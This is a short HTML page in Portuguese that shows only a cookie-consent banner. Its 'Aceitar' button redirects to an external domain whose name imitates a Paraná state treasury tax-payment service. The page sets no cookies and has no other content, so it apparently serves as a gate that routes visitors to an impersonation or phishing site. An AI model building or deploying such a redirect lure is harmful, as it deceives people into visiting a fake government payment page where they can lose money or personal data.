<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Política de Cookies</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #fff;
    }
    .cookie-banner {
      text-align: center;
      padding: 20px;
      max-width: 400px;
      border: 1px solid #ccc;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .cookie-banner p {
      margin-bottom: 20px;
      color: #333;
    }
    .cookie-buttons {
      display: flex;
      justify-content: center;
      gap: 15px;
    }
    .cookie-buttons button {
      padding: 10px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
    }
    .accept-btn {
      background-color: #4CAF50;
      color: white;
    }
    .deny-btn {
      background-color: #f44336;
      color: white;
    }
  </style>
</head>
<body>

  <div class="cookie-banner" id="cookieBanner">
    <p>Este site utiliza cookies para melhorar sua experiência. Deseja aceitar o uso de cookies?</p>
    <div class="cookie-buttons">
      <button class="accept-btn" onclick="aceitarCookies()">Aceitar</button>
      <button class="deny-btn" onclick="negarCookies()">Negar</button>
    </div>
  </div>

  <script>
    function aceitarCookies() {
      // Redirecione ou registre a aceitação
      window.location.href = "https://paranaguias.recolhimentodafazenda.org/"; // Substitua com o link desejado
    }

    function negarCookies() {
      // Redirecione ou feche o banner
      document.getElementById('cookieBanner').style.display = 'none';
    }
  </script>

</body>
</html>
